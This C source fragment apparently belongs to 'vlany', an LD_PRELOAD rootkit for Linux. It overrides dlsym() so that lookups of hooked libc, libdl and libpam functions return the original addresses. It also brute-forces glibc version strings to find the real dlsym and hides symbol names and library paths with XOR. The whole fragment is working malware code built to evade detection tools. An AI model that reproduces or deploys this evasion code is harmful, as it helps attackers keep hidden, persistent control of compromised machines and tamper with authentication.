extern void *_dl_sym(void *, const char *, void *);

void locate_dlsym()
{
    #ifdef DEBUG
        printf("[vlany] locate_dlsym() called\n");
    #endif

    char buf[32]; int maxver = 40;

    for(int a = 0; a < maxver; a++)
    {
        sprintf(buf, "GLIBC_2.%d", a);
        old_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
        if(old_dlsym) return;
    }

    for(int a = 0; a < maxver; a++)
    {
        for(int b = 0; b < maxver; b++)
        {
            sprintf(buf, "GLIBC_2.%d.%d", a, b);
            old_dlsym = (void*(*)(void *handle, const char *name)) dlvsym(RTLD_NEXT,"dlsym", buf);
            if(old_dlsym) return; // we got dlsym() via dlvsym(), return to let the function know we're done
        }
    }
}

void *dlsym(void *handle, const char *symbol)
{
    #ifdef DEBUG
        printf("[vlany] dlsym() called\n");
    #endif

    if(!old_dlsym) locate_dlsym();

    void *funcptr; int i;

    // we need to manipulate dlsym() so that it isn't allowed to resolve the address of hooked symbols and instead resolves the original symbol regardless
    
    // spoof for libc symbols
    for(i = 0; i < LIBC_SIZE; i++)
    {
        char *curr_call = strdup(libc_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libc_path = strdup(LIBC_PATH); xor(libc_path);
            void *libc = dlopen(libc_path, RTLD_LAZY);
            CLEAN(libc_path);

            funcptr = old_dlsym(libc, symbol);
            return funcptr;
        }
    }

    // spoof for libdl symbols
    for(i = 0; i < LIBDL_SIZE; i++)
    {
        char *curr_call = strdup(libdl_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libdl_path = strdup(LIBDL_PATH); xor(libdl_path);
            void *libdl = dlopen(libdl_path, RTLD_LAZY);
            CLEAN(libdl_path);

            funcptr = old_dlsym(libdl, symbol);
            return funcptr;
        }
    }

    // spoof for libpam
    for(i = 0; i < LIBPAM_SIZE; i++)
    {
        char *curr_call = strdup(libpam_calls[i]); xor(curr_call);
        if(!strcmp(symbol, curr_call))
        {
            char *libpam_path = strdup(LIBPAM_PATH); xor(libpam_path);
            void *libpam = dlopen(libpam_path, RTLD_LAZY);
            CLEAN(libpam_path);

            funcptr = old_dlsym(libpam, symbol);
            return funcptr;
        }
    }

    funcptr = old_dlsym(handle, symbol);
    return funcptr;
}
